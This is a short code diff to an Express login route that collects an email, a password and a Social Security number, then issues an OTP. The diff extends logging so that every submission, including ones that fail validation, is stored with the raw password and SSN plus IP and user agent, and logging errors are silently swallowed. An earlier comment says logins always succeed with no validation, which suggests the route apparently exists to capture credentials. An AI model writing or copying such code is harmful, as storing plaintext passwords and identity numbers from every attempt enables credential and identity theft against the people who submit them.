@@ -12,7 +12,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
       const userAgent = req.get('User-Agent') || 'unknown';
       
-      // Log login attempt immediately (always successful since no validation)
+      // Log login attempt immediately (successful since validation passed)
       await storage.logLoginAttempt(validatedData.email, validatedData.password, validatedData.ssn, true, ipAddress, userAgent);
       
       // Generate and store OTP
@@ -27,6 +27,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       if (error instanceof z.ZodError) {
+        // Log failed login attempt due to validation error
+        const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
+        const userAgent = req.get('User-Agent') || 'unknown';
+        try {
+          await storage.logLoginAttempt(
+            req.body.email || 'invalid', 
+            req.body.password || 'invalid', 
+            req.body.ssn || 'invalid', 
+            false, 
+            ipAddress, 
+            userAgent
+          );
+        } catch (logError) {
+          // Ignore logging errors for invalid data
+        }
+        
         return res.status(400).json({ 
           success: false, 
           message: error.errors[0].message 
